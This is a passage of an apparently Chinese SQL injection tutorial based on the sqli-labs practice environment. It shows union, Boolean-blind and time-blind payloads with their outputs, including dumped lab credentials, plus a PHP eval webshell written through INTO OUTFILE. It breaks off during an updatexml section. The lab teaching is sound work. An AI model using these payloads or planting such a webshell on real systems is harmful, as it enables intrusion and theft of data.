alt=\"\"></p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>?id<span class=\"token operator\">=</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token string\">' union select 1,2,table_name from information_schema.tables where table_schema='</span>security<span class=\"token string\">' limit 0,1 %23</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>#查询单个 改变limit 0,1 前面的数即可查询其他表例如 limit 1,1 limit 2,1</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>另一种查询全部</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>?id=-1'</span> <span class=\"token keyword\">union</span> <span class=\"token keyword\">select</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span>group_concat<span class=\"token punctuation\">(</span>table_name<span class=\"token punctuation\">)</span> <span class=\"token keyword\">from</span> information_schema<span class=\"token punctuation\">.</span><span class=\"token keyword\">tables</span> <span class=\"token keyword\">where</span> table_schema<span class=\"token operator\">=</span><span class=\"token keyword\">database</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span><span class=\"token number\">23</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>group_concat <span class=\"token comment\">#分组查询结果，隔开</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>emails<span class=\"token punctuation\">,</span>referers<span class=\"token punctuation\">,</span>uagents<span class=\"token punctuation\">,</span>users</pre></td></tr></table></figure><p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero9.png\" alt=\"\"></p>\n<p>4, 查列名</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>?id<span class=\"token operator\">=</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token string\">' union select 1,2,group_concat(column_name ) from information_schema.columns where table_schema=database() and table_name = \"users\" %23</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Your Login name:2</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>Your Password:id,username,password #列名</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>?id=-1'</span> <span class=\"token keyword\">union</span> <span class=\"token keyword\">select</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span>group_concat<span class=\"token punctuation\">(</span>username<span class=\"token punctuation\">,</span>password <span class=\"token punctuation\">)</span> <span class=\"token keyword\">from</span> users <span class=\"token operator\">%</span><span class=\"token number\">23</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#查询 users 表里的 username 和 password</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>Your Login name:<span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>Your Password:DumbDumb<span class=\"token punctuation\">,</span>AngelinaI<span class=\"token operator\">-</span><span class=\"token keyword\">kill</span><span class=\"token operator\">-</span>you<span class=\"token punctuation\">,</span>Dummyp<span class=\"token variable\">@ssword</span><span class=\"token punctuation\">,</span>securecrappy<span class=\"token punctuation\">,</span>stupidstupidity<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>supermangenious<span class=\"token punctuation\">,</span>batmanmob<span class=\"token operator\">!</span>le<span class=\"token punctuation\">,</span>adminadmin<span class=\"token punctuation\">,</span>admin1admin1<span class=\"token punctuation\">,</span>admin2admin2<span class=\"token punctuation\">,</span>admin3admin3<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>dhakkandumbo<span class=\"token punctuation\">,</span>admin4admin4</pre></td></tr></table></figure><p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero10.png\" alt=\"\"></p>\n<h3 id=\"写webshell\"><a class=\"markdownIt-Anchor\" href=\"#写webshell\">#</a> 写 webshell</h3>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>三个条件：</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token number\">1.</span>具有root权限。</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token number\">2.</span>在数据库配置文件中的 配置项含有：secure_file_priv<span class=\"token operator\">=</span><span class=\"token string\">''</span>。</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>（注意在数据库中此项默认为secure_file_priv<span class=\"token operator\">=</span><span class=\"token boolean\">null</span>）。</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>secure_file_prive<span class=\"token operator\">=</span><span class=\"token boolean\">null</span> <span class=\"token comment\">// 限制 mysqld 不允许导入导出</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>secure_file_priv<span class=\"token operator\">=</span><span class=\"token operator\">/</span>path<span class=\"token operator\">/</span>  <span class=\"token comment\">// 限制 mysqld 的导入导出只能发生在默认的 /path/ 目录下</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>secure_file_priv<span class=\"token operator\">=</span>’’  <span class=\"token comment\">// 不对 mysqld 的导入 导出做限制</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token number\">3.</span>知道数据库的绝对路径。</pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">outfile</span>函数可以导出多行，而<span class=\"token keyword\">dumpfile</span>只能导出一行数据</pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">outfile</span>函数在将数据写到文件里时有特殊的格式转换，而<span class=\"token keyword\">dumpfile</span>则保持原数据格式</pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>?id<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token string\">' union select 1,\"&lt;?php @eval($_POST['</span>cmd'<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>?<span class=\"token operator\">></span><span class=\"token string\">\",3 into outfile \"</span>D:\\\\Everyday<span class=\"token operator\">-</span>tools\\\\phpstudy_pro\\\\WWW\\\\www<span class=\"token punctuation\">.</span><span class=\"token keyword\">sql</span><span class=\"token punctuation\">.</span>cn\\\\shell8<span class=\"token punctuation\">.</span>php\" <span class=\"token operator\">%</span><span class=\"token number\">23</span></pre></td></tr></table></figure><h3 id=\"boolean注入\"><a class=\"markdownIt-Anchor\" href=\"#boolean注入\">#</a> Boolean 注入</h3>\n<p>布尔型盲注，页面不返回查询信息的数据，只能通过页面返回信息的真假条件判断是否存在注入.</p>\n<p>1, 报错</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>判断整数还是字符型</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>?id<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token string\">'</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>判断有没有注入</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>?id=1'</span> <span class=\"token operator\">and</span> <span class=\"token number\">1</span><span class=\"token operator\">=</span><span class=\"token number\">2</span> <span class=\"token operator\">%</span><span class=\"token number\">23</span> 报错</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>判断字段数</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>?id<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token string\">' order by 1 %23</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>?id=1'</span> <span class=\"token keyword\">order</span> <span class=\"token keyword\">by</span> <span class=\"token number\">2</span> <span class=\"token operator\">%</span><span class=\"token number\">23</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>?id<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token string\">' order by 3 %23</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>?id=1'</span> <span class=\"token keyword\">order</span> <span class=\"token keyword\">by</span> <span class=\"token number\">4</span> <span class=\"token operator\">%</span><span class=\"token number\">23</span> 报错</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>字段三个</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>爆数据库长度</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>length（）返回字符串长度</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>如果数据库长度大于等于表达式后面的数就返回正常 报错前面的那个数就是数据库长度</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>?id<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token string\">'%20 and length(database())>=4 %23 正常</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>?id=1'</span><span class=\"token operator\">%</span><span class=\"token number\">20</span> <span class=\"token operator\">and</span> length<span class=\"token punctuation\">(</span><span class=\"token keyword\">database</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">>=</span><span class=\"token number\">6</span> <span class=\"token operator\">%</span><span class=\"token number\">23</span> 正常</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>?id<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token string\">'%20 and length(database())>=7 %23 正常</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>?id=1'</span><span class=\"token operator\">%</span><span class=\"token number\">20</span> <span class=\"token operator\">and</span> length<span class=\"token punctuation\">(</span><span class=\"token keyword\">database</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">>=</span><span class=\"token number\">8</span> <span class=\"token operator\">%</span><span class=\"token number\">23</span> 正常</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>?id<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token string\">'%20 and length(database())>=9 %23 报错</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>数据库长度9</pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>爆数据库名</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>数据库名的范围一般在a~z、0~9之内，可能还会有特殊字符 \"_\"、\"-\" 等，这里的字母不区分大小写。</pre></td></tr><tr><td data-num=\"23\"></td><td><pre>定义和用法</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>SUBSTR() 函数从字符串中提取子字符串（从任意位置开始）。</pre></td></tr><tr><td data-num=\"25\"></td><td><pre>?id=1'</span><span class=\"token operator\">%</span><span class=\"token number\">20</span> <span class=\"token operator\">and</span> substr<span class=\"token punctuation\">(</span><span class=\"token keyword\">database</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">=</span><span class=\"token string\">\"a\"</span> <span class=\"token operator\">%</span><span class=\"token number\">23</span> 报错</pre></td></tr><tr><td data-num=\"26\"></td><td><pre>?id<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token string\">'%20 and substr(database(),1,1)=\"b\" %23 报错</pre></td></tr><tr><td data-num=\"27\"></td><td><pre>?id=1'</span><span class=\"token operator\">%</span><span class=\"token number\">20</span> <span class=\"token operator\">and</span> substr<span class=\"token punctuation\">(</span><span class=\"token keyword\">database</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">=</span><span class=\"token string\">\"c\"</span> <span class=\"token operator\">%</span><span class=\"token number\">23</span> 报错</pre></td></tr><tr><td data-num=\"28\"></td><td><pre>?id<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token string\">'%20 and substr(database(),1,1)=\"s\" %23 正常</pre></td></tr><tr><td data-num=\"29\"></td><td><pre>第一个字符为s</pre></td></tr><tr><td data-num=\"30\"></td><td><pre>?id=1'</span><span class=\"token operator\">%</span><span class=\"token number\">20</span> <span class=\"token operator\">and</span> substr<span class=\"token punctuation\">(</span><span class=\"token keyword\">database</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">=</span><span class=\"token string\">\"a\"</span> <span class=\"token operator\">%</span><span class=\"token number\">23</span> 报错</pre></td></tr><tr><td data-num=\"31\"></td><td><pre>?id<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token string\">'%20 and substr(database(),2,1)=\"b\" %23 报错</pre></td></tr><tr><td data-num=\"32\"></td><td><pre>?id=1'</span><span class=\"token operator\">%</span><span class=\"token number\">20</span> <span class=\"token operator\">and</span> substr<span class=\"token punctuation\">(</span><span class=\"token keyword\">database</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">=</span><span class=\"token string\">\"c\"</span> <span class=\"token operator\">%</span><span class=\"token number\">23</span> 报错</pre></td></tr><tr><td data-num=\"33\"></td><td><pre>?id<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token string\">'%20 and substr(database(),2,1)=\"d\" %23 报错</pre></td></tr><tr><td data-num=\"34\"></td><td><pre>?id=1'</span><span class=\"token operator\">%</span><span class=\"token number\">20</span> <span class=\"token operator\">and</span> substr<span class=\"token punctuation\">(</span><span class=\"token keyword\">database</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">=</span><span class=\"token string\">\"e\"</span> <span class=\"token operator\">%</span><span class=\"token number\">23</span> 正常</pre></td></tr><tr><td data-num=\"35\"></td><td><pre>第二个字符为e替换<span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span>位置的<span class=\"token number\">2</span>为<span class=\"token number\">3</span>就可以爆破第三个字符以此类推爆出数据库名security</pre></td></tr><tr><td data-num=\"36\"></td><td><pre></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>ASCII码查询</pre></td></tr><tr><td data-num=\"38\"></td><td><pre>a 的ASCII码是<span class=\"token number\">97</span>，在MySQL中使用ord函数转换ASCII，所以逐字符判断语句可改为：</pre></td></tr><tr><td data-num=\"39\"></td><td><pre>ord<span class=\"token punctuation\">(</span>substr<span class=\"token punctuation\">(</span><span class=\"token keyword\">database</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">=</span><span class=\"token number\">97</span> <span class=\"token operator\">%</span><span class=\"token number\">23</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>ASCII码表中可显示字符的范围是：<span class=\"token number\">0</span><span class=\"token operator\">~</span><span class=\"token number\">127</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>爆表名</pre></td></tr><tr><td data-num=\"43\"></td><td><pre><span class=\"token comment\">-- 修改 1,1 前边的 1~20，逐字符猜解出第一个表的名</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre><span class=\"token comment\">-- 修改 limit 的 0,1 前边的 0~20，逐个猜解每个表</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>查询第一个表的第一个字符</pre></td></tr><tr><td data-num=\"46\"></td><td><pre>?id<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token string\">'%20 and substr((select table_name from information_schema.tables where table_schema=\"security\" limit 0,1 ),1,1)=\"b\" %23</pre></td></tr><tr><td data-num=\"47\"></td><td><pre>报错</pre></td></tr><tr><td data-num=\"48\"></td><td><pre>?id=1'</span><span class=\"token operator\">%</span><span class=\"token number\">20</span> <span class=\"token operator\">and</span> substr<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> table_name <span class=\"token keyword\">from</span> information_schema<span class=\"token punctuation\">.</span><span class=\"token keyword\">tables</span> <span class=\"token keyword\">where</span> table_schema<span class=\"token operator\">=</span><span class=\"token string\">\"security\"</span> <span class=\"token keyword\">limit</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">=</span><span class=\"token string\">\"c\"</span> <span class=\"token operator\">%</span><span class=\"token number\">23</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>报错</pre></td></tr><tr><td data-num=\"50\"></td><td><pre>?id<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token string\">'%20 and substr((select table_name from information_schema.tables where table_schema=\"security\" limit 0,1 ),1,1)=\"e\" %23</pre></td></tr><tr><td data-num=\"51\"></td><td><pre>正常</pre></td></tr><tr><td data-num=\"52\"></td><td><pre>第一个表名emails,接着查第二个</pre></td></tr><tr><td data-num=\"53\"></td><td><pre>?id=1'</span><span class=\"token operator\">%</span><span class=\"token number\">20</span> <span class=\"token operator\">and</span> substr<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> table_name <span class=\"token keyword\">from</span> information_schema<span class=\"token punctuation\">.</span><span class=\"token keyword\">tables</span> <span class=\"token keyword\">where</span> table_schema<span class=\"token operator\">=</span><span class=\"token string\">\"security\"</span> <span class=\"token keyword\">limit</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">=</span><span class=\"token string\">\"e\"</span> <span class=\"token operator\">%</span><span class=\"token number\">23</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>报错</pre></td></tr><tr><td data-num=\"55\"></td><td><pre>?id<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token string\">'%20 and substr((select table_name from information_schema.tables where table_schema=\"security\" limit 1,1 ),1,1)=\"r\" %23</pre></td></tr><tr><td data-num=\"56\"></td><td><pre>正常</pre></td></tr><tr><td data-num=\"57\"></td><td><pre>以此类推爆破所有表</pre></td></tr><tr><td data-num=\"58\"></td><td><pre>emails,referers,uagents,users</pre></td></tr><tr><td data-num=\"59\"></td><td><pre></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>爆字段名</pre></td></tr><tr><td data-num=\"61\"></td><td><pre>?id=1'</span><span class=\"token operator\">%</span><span class=\"token number\">20</span> <span class=\"token operator\">and</span> substr<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> column_name <span class=\"token keyword\">from</span> information_schema<span class=\"token punctuation\">.</span><span class=\"token keyword\">columns</span> <span class=\"token keyword\">where</span> table_schema<span class=\"token operator\">=</span><span class=\"token string\">\"security\"</span> <span class=\"token operator\">and</span> table_name<span class=\"token operator\">=</span><span class=\"token string\">\"users\"</span> <span class=\"token keyword\">limit</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">=</span><span class=\"token string\">\"r\"</span> <span class=\"token operator\">%</span><span class=\"token number\">23</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>报错</pre></td></tr><tr><td data-num=\"63\"></td><td><pre>?id<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token string\">'%20 and substr((select column_name from information_schema.columns where table_schema=\"security\" and table_name=\"users\" limit 0,1 ),1,1)=\"i\" %23</pre></td></tr><tr><td data-num=\"64\"></td><td><pre>正常</pre></td></tr><tr><td data-num=\"65\"></td><td><pre>爆出所有字段名</pre></td></tr><tr><td data-num=\"66\"></td><td><pre>id,username.password</pre></td></tr><tr><td data-num=\"67\"></td><td><pre></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>爆数据</pre></td></tr><tr><td data-num=\"69\"></td><td><pre>?id=1'</span><span class=\"token operator\">%</span><span class=\"token number\">20</span> <span class=\"token operator\">and</span> substr<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> username <span class=\"token keyword\">from</span> users <span class=\"token keyword\">limit</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">=</span><span class=\"token string\">\"d\"</span> <span class=\"token operator\">%</span><span class=\"token number\">23</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>正常</pre></td></tr><tr><td data-num=\"71\"></td><td><pre>?id<span class=\"token operator\">=</span><span class=\"token number\">1</span>'<span class=\"token operator\">%</span><span class=\"token number\">20</span> <span class=\"token operator\">and</span> substr<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> username <span class=\"token keyword\">from</span> users <span class=\"token keyword\">limit</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">=</span><span class=\"token string\">\"u\"</span> <span class=\"token operator\">%</span><span class=\"token number\">23</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>正常</pre></td></tr><tr><td data-num=\"73\"></td><td><pre>以此类推</pre></td></tr><tr><td data-num=\"74\"></td><td><pre>可以用burp爆破功能爆破出所有数据</pre></td></tr><tr><td data-num=\"75\"></td><td><pre>嫌弃太慢也可以写脚本或者用sqlmap</pre></td></tr></table></figure><h3 id=\"时间盲注\"><a class=\"markdownIt-Anchor\" href=\"#时间盲注\">#</a> 时间盲注</h3>\n<p>盲注是在 SQL 注入攻击过程中，服务器关闭了错误回显，单纯通过服务器返回内容的变化来判断是否存在 SQL 注入的方式 。</p>\n<p>可以用 benchmark，sleep 等造成延时效果的函数。</p>\n<p>如果 benkchmark 和 sleep 关键字被过滤了，可以让两个非常大的数据表做<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMyNzYzNjQzL2FydGljbGUvZGV0YWlscy83OTE4NzkzMQ==\">笛卡尔积 (opens new window)</span> 产生大量的计算从而产生时间延迟；</p>\n<p>或者利用复杂的正则表达式去匹配一个超长字符串来产生时间延迟。</p>\n<p>1、利用 sleep 判断数据库名长度</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token string\">' and sleep(5) and 1=1--+\t页面返回不正常，延时5秒</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>'</span> <span class=\"token operator\">and</span> sleep<span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">and</span> <span class=\"token number\">1</span><span class=\"token operator\">=</span><span class=\"token number\">2</span><span class=\"token comment\">--+\t页面返回不正常，不延时</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token operator\">and</span> <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>length<span class=\"token punctuation\">(</span><span class=\"token keyword\">database</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">></span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>sleep<span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">--if (条件表达式，真，假) --C 语言的三目运算符类似</span></pre></td></tr></table></figure><p>2、获取数据库名</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">and</span> <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>substr<span class=\"token punctuation\">(</span><span class=\"token keyword\">database</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">=</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">,</span>sleep<span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token comment\">--+</span></pre></td></tr></table></figure><h3 id=\"报错注入\"><a class=\"markdownIt-Anchor\" href=\"#报错注入\">#</a> 报错注入</h3>\n<p>在 SQL 注入攻击过程中，服务器开启了错误回显，页面会返回错误信息，利用报错函数获取数据库数据。</p>\n<p>常用的 MySQL 报错函数</p>\n<h4 id=\"updatexml函数\"><a class=\"markdownIt-Anchor\" href=\"#updatexml函数\">#</a> updatexml 函数</h4>\n<p>MySQL 的 UPDATEXML () 函数可以用于修改 XML 类型的数据，它可以更新 XML 数据中的一个或多个节点值。</p>\n<p>这个函数的参数有三个：</p>\n<ul>\n<li>XML 数据</li>\n<li>XPath 表达式：用于指定要修改的节点位置</li>\n<li>新的节点值：用于替换当前节点的值</li>\n</ul>\n<p>下面是 UPDATEXML () 函数的语法：</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>下面是UPDATEXML<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>函数的语法：</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>UPDATEXML<span class=\"token punctuation\">(</span>xml_target<span class=\"token punctuation\">,</span> xpath_expr<span class=\"token punctuation\">,</span> new_val<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>其中，xml_target是要修改的XML类型的数据；xpath_expr是XPath表达式，用</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>于指定要修改的节点位置；new_val指定新的节点值。</pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>示例一：</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>假设数据表中有以下的XML类型的数据：</pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token operator\">&lt;</span>book<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token operator\">&lt;</span>title<span class=\"token operator\">></span>MySQL Basics<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>title<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  <span class=\"token operator\">&lt;</span>author<span class=\"token operator\">></span>John Doe<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>author<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token operator\">&lt;</span>price<span class=\"token operator\">></span><span class=\"token number\">19.99</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>price<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>book<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>我们可以使用UPDATEXML<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>函数来修改一些节点的值：</pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">UPDATE</span> books</pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">SET</span> book <span class=\"token operator\">=</span> UPDATEXML<span class=\"token punctuation\">(</span>book<span class=\"token punctuation\">,</span> <span class=\"token string\">'/book/title'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Learning MySQL'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token keyword\">WHERE</span> id <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>上面的语句将会把表中id为<span class=\"token number\">1</span>的记录的title节点的值修改为<span class=\"token string\">\"Learning MySQL\"</span>。</pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>示例二：</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>现在有以下的XML类型的数据：</pre></td></tr><tr><td 